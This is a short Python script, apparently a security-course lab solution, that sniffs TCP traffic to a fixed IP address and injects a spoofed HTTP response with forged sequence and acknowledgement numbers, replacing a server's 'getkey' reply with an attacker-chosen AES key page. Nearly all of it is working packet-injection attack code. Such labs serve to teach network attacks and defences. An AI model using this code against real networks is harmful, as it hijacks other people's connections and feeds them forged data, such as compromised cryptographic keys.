#!/usr/bin/python
import dnet
from scapy.all import *
import socket

__ip = dnet.ip()

def inject_pkt(pkt):
    str_pkt = str(pkt)
    bytes_ = __ip.send(str_pkt)
    print ("bytes: %d"%bytes_)


#######################################
## EDIT THIS FUNCTION TO ATTACK
## PROFESSOR VULN'S getkey.py SCRIPT
#######################################
def handle_pkt(pkt):
    if "GET / HTTP/1.1" in str(pkt):
        payload_head = "HTTP/1.1 200 OK\r\nServer: nginx/1.4.6 (Ubuntu)\r\nContent-Type: text/html; charset=UTF-8\r\nConnection: Closed\r\n\r\n\r\n"
        payload_html = """<html><head><title>Free AES Key Generator!</title></head><body><h1 style="margin-bottom: 0px">Free AES Key Generator!</h1><span style="font-size: 5%">Definitely not run by the NSA.</span><br/><br/><br/>Your <i>free</i> AES-256 key: <b>4d6167696320576f7264733a2053717565616d697368204f7373696672616765</b><br/></body></html>\r\n"""
	payload = payload_head + payload_html +"\r\n\r\n\r\n"
        sendpkt = IP(src=pkt[IP].dst,dst=pkt[IP].src)/TCP(seq = pkt[TCP].ack, ack = pkt[TCP].seq + len(pkt[TCP].payload), dport = pkt[TCP].sport, sport = pkt[TCP].dport, flags = 'PA')/payload
	inject_pkt(sendpkt)

def main():
    sniff(filter="tcp and host 54.85.9.24", prn=handle_pkt)

if __name__ == '__main__':
    main()
